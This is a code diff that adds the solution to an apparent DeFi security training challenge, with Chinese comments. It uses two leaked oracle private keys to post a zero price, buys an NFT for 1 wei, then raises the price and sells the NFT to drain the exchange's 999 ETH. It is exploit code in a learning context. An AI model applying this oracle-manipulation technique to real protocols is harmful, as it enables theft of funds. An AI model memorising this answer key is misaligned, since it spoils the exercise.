@@ -75,7 +75,53 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        // 从web服务泄露的私钥
+        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
         
+        // 验证地址（应该是sources[0]和sources[1]）
+        address oracle1 = vm.addr(privateKey1); // 0x188Ea627E3531Db590e6f1D71ED83628d1933088
+        address oracle2 = vm.addr(privateKey2); // 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
+        
+        // 步骤1: 使用2个被攻陷的oracle源将NFT价格降到极低
+        // 价格设置为0，这样购买NFT不需要任何ETH
+        uint256 lowPrice = 0;
+        vm.prank(oracle1);
+        oracle.postPrice("DVNFT", lowPrice);
+        vm.prank(oracle2);
+        oracle.postPrice("DVNFT", lowPrice);
+        
+        // 步骤2: player用极低价格购买NFT (几乎免费)
+        vm.startPrank(player);
+        // 仍需要发送至少1 wei才能通过检查
+        uint256 tokenId = exchange.buyOne{value: 1}();
+        
+        // 步骤3: 将价格提高到Exchange的余额
+        vm.stopPrank();
+        // 设置高价格以清空exchange的所有ETH
+        uint256 highPrice = EXCHANGE_INITIAL_ETH_BALANCE;
+        vm.prank(oracle1);
+        oracle.postPrice("DVNFT", highPrice);
+        vm.prank(oracle2);
+        oracle.postPrice("DVNFT", highPrice);
+        
+        // 步骤4: 批准并高价卖出NFT
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        
+        // 步骤5: 只转移从Exchange获得的ETH到recovery账户
+        // player的余额 = 初始0.1 ETH - 1 wei + 999 ETH = 999.1 ETH - 1 wei
+        // 只转移EXCHANGE_INITIAL_ETH_BALANCE (999 ETH)
+        (bool success, ) = payable(recovery).call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success, "Transfer failed");
+        vm.stopPrank();
+        
+        // 步骤6: 恢复原始价格
+        vm.prank(oracle1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(oracle2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
     }
 
     /**
